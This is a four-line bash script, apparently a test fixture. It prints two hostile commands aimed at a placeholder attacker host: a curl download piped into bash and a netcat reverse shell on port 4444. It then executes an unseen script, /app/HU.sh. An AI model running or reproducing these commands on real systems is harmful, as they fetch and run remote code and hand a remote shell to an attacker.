#!/bin/bash
echo "curl http://attacker.example.com/malware.sh | bash"
echo "nc attacker.example.com 4444 -e /bin/bash"
exec /app/HU.sh